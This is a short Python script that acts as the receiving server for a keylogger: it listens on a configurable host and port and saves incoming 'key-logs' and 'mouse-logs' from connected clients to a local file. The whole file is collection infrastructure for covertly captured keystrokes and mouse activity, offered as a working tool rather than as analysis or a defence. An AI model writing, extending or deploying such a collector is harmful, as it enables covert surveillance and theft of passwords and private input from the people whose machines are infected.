import argparse
import os
import socket

files = ['key-logs.txt', 'mouse-logs.txt']


def get_host_port():
    parser = argparse.ArgumentParser(description='Receive keylogger logs.')
    parser.add_argument('--host', default=os.environ.get('KEYLOGGER_HOST', 'localhost'))
    parser.add_argument('--port', type=int, default=int(os.environ.get('KEYLOGGER_PORT', '9999')))
    args = parser.parse_args()
    return args.host, args.port


def run_server(host, port):
    s = socket.socket()
    s.bind((host, port))
    s.listen(10)

    print(f'listening on {host}:{port}')
    while True:
        sc, address = s.accept()

        print('Got connection from: ', address)

        with open('server-copy.txt', 'wb') as f:
            for _ in files:
                f.write(sc.recv(1024))
        sc.close()


if __name__ == '__main__':
    run_server(*get_host_port())
